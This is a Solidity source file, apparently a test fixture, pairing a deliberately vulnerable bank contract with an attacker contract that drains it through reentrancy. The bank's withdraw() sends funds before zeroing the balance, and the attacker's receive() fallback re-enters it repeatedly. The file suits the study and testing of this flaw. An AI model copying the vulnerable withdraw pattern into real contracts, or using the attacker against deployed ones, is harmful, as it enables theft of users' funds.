// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;
    uint256 public constant ATTACK_LIMIT = 3; // Limit to prevent infinite loops in tests

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    // Fallback function that gets called when receiving ETH
    receive() external payable {
        if (attackCount < ATTACK_LIMIT) {
            attackCount++;
            // Re-enter the vulnerable contract
            vulnerableBank.withdraw();
        }
    }

    function attack() external payable {
        // Initial deposit
        vulnerableBank.deposit{value: msg.value}();
        attackCount = 0;
        // Start the attack
        vulnerableBank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// The vulnerable contract (imported for testing)
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // VULNERABLE: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
}